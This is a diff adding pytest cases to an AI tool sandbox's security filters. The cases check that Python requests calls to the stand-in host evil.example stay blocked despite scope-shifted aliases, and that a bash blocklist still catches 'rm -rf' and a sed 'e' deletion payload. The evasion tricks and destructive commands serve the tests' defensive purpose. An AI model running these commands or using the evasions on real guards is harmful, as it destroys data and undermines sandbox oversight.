@@ -302,6 +302,44 @@ class TestRebindingDropsStaleAliases:
     def test_shadowed_alias_still_blocked(self, code):
         _blocked(code, expect_phrase = "Blocked: host not in sandbox allowlist")
 
+    @pytest.mark.parametrize(
+        "code",
+        [
+            # The alias map is not scope aware, so resolving through it must only ever ADD a way to
+            # recognise the call: an import in a function body, a class body or an untaken branch
+            # would otherwise rewrite a module-level `requests.get` to the unrecognised `socket.get`.
+            pytest.param(
+                "import requests\n"
+                "def f():\n"
+                "    import socket as requests\n"
+                'requests.get("https://evil.example/x")',
+                id = "alias_bound_in_a_function_body",
+            ),
+            pytest.param(
+                "import requests\n"
+                "if False:\n"
+                "    import socket as requests\n"
+                'requests.get("https://evil.example/x")',
+                id = "alias_bound_in_an_untaken_branch",
+            ),
+            pytest.param(
+                "import requests\n"
+                "class C:\n"
+                "    import socket as requests\n"
+                'requests.get("https://evil.example/x")',
+                id = "alias_bound_in_a_class_body",
+            ),
+            pytest.param(
+                "import requests\n"
+                'requests.get("https://evil.example/x")\n'
+                "import socket as requests",
+                id = "alias_bound_after_the_call",
+            ),
+        ],
+    )
+    def test_alias_from_another_scope_cannot_hide_the_call(self, code):
+        _blocked(code, expect_phrase = "Blocked: host not in sandbox allowlist")
+
     def test_shadowed_alias_still_fails_closed_on_a_dynamic_host(self):
         _blocked(
             "import socket as requests\nimport requests\nrequests.get('https://' + h)",
@@ -2311,6 +2349,51 @@ class TestBashBlocklistPosition:
         # `alias zap='rm -rf'` stores a command bash runs when zap is invoked.
         assert "rm" in self._find()("alias zap='rm -rf'")
         assert self._find()("alias ll='ls -la'") == set()
+
+
+class TestEscapedNewlineIsNotACommandBoundary:
+    """The shell removes a backslash-newline before it reads a command, so the words either side
+    belong to one command. Treating that line break as a boundary refused `echo hi \\<newline>A=1 rm
+    -rf x`, which is one `echo`, while the join must not reach inside single quotes, where the shell
+    keeps both characters and a sed `e` payload really continues onto the next line."""
+
+    @staticmethod
+    def _find():
+        from core.inference.tools import _find_blocked_commands
+        return _find_blocked_commands
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            pytest.param("echo hi \\\nA=1 rm -rf x", id = "continuation_then_assignment"),
+            pytest.param("echo hi \\\nrm -rf x", id = "continuation_then_blocked_word"),
+            pytest.param("echo hi \\\r\nA=1 rm -rf x", id = "continuation_crlf"),
+            pytest.param('echo "hi \\\nA=1 rm -rf x"', id = "continuation_in_double_quotes"),
+            pytest.param(
+                "python train.py \\\n  --lr 1e-4 \\\n  --out /tmp/x", id = "ordinary_continuation"
+            ),
+        ],
+    )
+    def test_joined_line_is_one_command(self, command):
+        assert self._find()(command) == set(), command
+
+    @pytest.mark.parametrize(
+        "command,blocked_cmd",
+        [
+            # Joining puts `rm` at command position behind `env`, where it really runs.
+            pytest.param("env \\\n  FOO=bar rm -rf /tmp/build", "rm", id = "env_prefix_still_runs"),
+            # A real line break is still a boundary.
+            pytest.param("echo hi\nA=1 rm -rf x", "rm", id = "unescaped_newline_still_boundary"),
+            # Single quotes keep the pair, and sed's `e` executes what follows.
+            pytest.param(
+                "sed -n '1e touch a\\\nrm -f victim' f", "rm", id = "single_quoted_payload_runs"
+            ),
+            # An escaped backslash consumes both characters, so the newline still stands.
+            pytest.param("echo hi \\\\\nrm -rf x", "rm", id = "escaped_backslash_then_newline"),
+        ],
+    )
+    def test_real_command_position_still_blocked(self, command, blocked_cmd):
+        assert blocked_cmd in self._find()(command), command
 
 
 class TestBashBlocklistNewlineCommandPosition:
